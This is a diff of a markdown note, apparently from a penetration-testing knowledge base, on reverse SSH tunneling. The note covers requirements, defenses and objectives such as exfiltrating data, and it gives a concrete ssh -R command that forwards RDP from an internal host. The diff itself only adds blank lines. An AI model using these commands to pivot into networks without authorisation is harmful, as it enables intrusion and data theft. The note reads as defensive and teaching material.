@@ -37,11 +37,15 @@ From a technical perspective, this technique requires the attacker to have acces
 
 From a business perspective, this technique can be used by attackers to steal sensitive data from a compromised network. By bypassing network security measures, attackers can gain access to data that would otherwise be protected. It is important for organizations to be aware of this technique and take steps to prevent it from being used against them.
 
+ 
+
 ## Requirements
 
 1. SSH access to a machine on the target network
 
 1. Ability to create a reverse SSH tunnel
+
+ 
 
 ## Defense
 
@@ -51,6 +55,8 @@ From a business perspective, this technique can be used by attackers to steal se
 
 1. Implement two-factor authentication for SSH access
 
+ 
+
 ## Objectives
 
 1. Gain access to a remote host
@@ -59,13 +65,23 @@ From a business perspective, this technique can be used by attackers to steal se
 
 1. Exfiltrate data from a compromised network
 
+ 
+
 # Instructions
 
 1. To create a reverse SSH tunnel, use the ssh command with the -R option. This will allow you to connect to a remote server and forward traffic from a local port to a remote port on the server. The bindaddr is the IP address to bind the remote port to, port is the remote port number, localhost is the IP address of the local machine, localport is the local port number, user is the username on the remote server, and host is the IP address or hostname of the remote server.
 
+ 
+
+
+
 **Code**: [[ssh -R [bindaddr]:[port]:[localhost]:[localport] []]
 
+
+
 > The reverse SSH tunneling is a technique used to access a remote system securely even if the remote system is behind a firewall or NAT. This technique works by creating a tunnel between the local and remote systems, allowing traffic to be forwarded from the local system to the remote system via the tunnel. The -R option is used to specify the reverse tunnel, and the bindaddr, port, localhost, and localport options are used to specify the details of the tunnel. The username and hostname of the remote server are also required to establish the SSH connection.
+
+
 
 **Command** ([[Reverse SSH tunneling to local machine]]):
 
@@ -73,11 +89,17 @@ From a business perspective, this technique can be used by attackers to steal se
 ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]
 ```
 
+
+
+
+
 **Command** ([[Reverse SSH tunneling to remote machine]]):
 
 ```bash
 ssh -R 3389:10.1.1.224:3389 root@10.11.0.32
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -101,3 +123,5 @@ ssh -R 3389:10.1.1.224:3389 root@10.11.0.32
 - [[Network Pivoting Techniques]]
 - [[Remote Port Forwarding]]
 - [[SSH]]
+
+
